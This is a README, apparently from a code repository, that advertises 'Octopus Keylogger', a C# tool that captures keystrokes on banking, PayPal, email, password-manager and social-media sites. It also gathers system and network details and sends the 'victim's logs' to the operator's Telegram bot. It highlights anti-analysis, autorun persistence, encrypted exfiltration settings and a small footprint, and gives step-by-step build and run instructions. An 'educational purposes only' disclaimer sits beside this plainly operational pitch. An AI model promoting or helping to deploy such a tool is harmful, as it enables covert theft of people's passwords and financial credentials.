# Octopus Keylogger
<p align="center">
  <img src="https://i.ibb.co/Yyv9Jjq/logo.png"> <br>
  <i>Smart Keylogger written in C#, logs will be sent to your Telegram bot.</i>
</p>



# :rotating_light: Disclaimer :rotating_light:
<p align="center">I, the creator, am not responsible for any actions, and or damages, caused by this software.</p>
<p align="center">You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.</p>
<p align="center">I will not be held accountable for any illegal activities.</p>



***

# :octopus: Data extraction:
- [x] AntiAnalysis features
- [x] Get system info (OS Version, Computer Name, Username)
- [x] Grab Antivirus software installed
- [x] Get Network info (Gateway, Internal and External IP address)
- [X] Grab Social Networks (and also other services, see the entire list below) keystrokes 
- [x] Autorun module 

# :brain: Why is it "smart"?
Octopus keylogger grabs only the keystrokes of specific services (reducing the probability of catching junk keystrokes).

Actual supported services:

``` Instagram, Facebook, Gmail, Yandex, Twitter, Outlook, Discord, Twitch, Telegram, Skype, Viber, Protonmail, Password Manager, Generic Messaging services, Generic Bank, Paypal, vk.com, ok.ru, Whatsapp, Linkedin", Reddit, Flickr, Youtube, Pinterest, Tiktok, Netflix, Disney, Amazon```

Your Telegram bot's informations will be encrypted, it will only be decrypted at runtime in the process of sending victim's logs.

Another reason to use it is that it is very tiny (40 kilobytes of compiled executable).

 # Runtime requirements
 - Builder.exe ([NET Runtime 6.0.*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0))
 - Stub.exe ([NET Framework 4.7.2](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net472))

# Usage
:one: Run Builder.exe
:two: Enter your Telegram api token and Telegram chat id informations
:three: Check your telegram bot, and enter the 2FA code you received
:four: If everything is ok, your keylogger will be saved in Stub/OctopusKeylogger.exe  
:five: Run OctopusKeylogger.exe and let the magic begin :sparkles:

***

# :calling: Telegram notification:
<p align="center">
  <img src="https://i.ibb.co/cY5Bmqx/telegram-Bot.jpg">
</p>
***

